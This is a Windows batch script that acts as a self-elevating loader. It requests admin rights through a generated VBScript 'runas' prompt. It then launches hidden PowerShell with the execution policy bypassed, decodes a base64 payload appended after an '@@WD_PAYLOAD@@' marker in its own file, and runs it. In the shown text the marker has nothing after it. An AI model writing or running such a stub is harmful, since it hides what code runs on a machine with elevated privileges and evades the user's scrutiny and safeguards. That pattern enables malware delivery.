@echo off
setlocal
net session >nul 2>&1
if %errorLevel%==0 goto RUN
> "%TEMP%\wd_uac.vbs" echo Set a=CreateObject("Shell.Application")
>>"%TEMP%\wd_uac.vbs" echo a.ShellExecute "cmd.exe","/c ""%~f0""","","runas",1
wscript //nologo "%TEMP%\wd_uac.vbs"
exit /b
:RUN
set "WD_BAT=%~f0"
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -Command "& {$p=$env:WD_BAT; $raw=[IO.File]::ReadAllText($p); $mark='@@WD_PAYLOAD@@'; $i=$raw.LastIndexOf($mark); if($i -lt 0){throw 'payload missing'}; $e=($raw.Substring($i+$mark.Length) -replace '[^A-Za-z0-9+/=]',''); $s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e)); & ([scriptblock]::Create($s)) }"
if errorlevel 1 pause
exit /b
@@WD_PAYLOAD@@
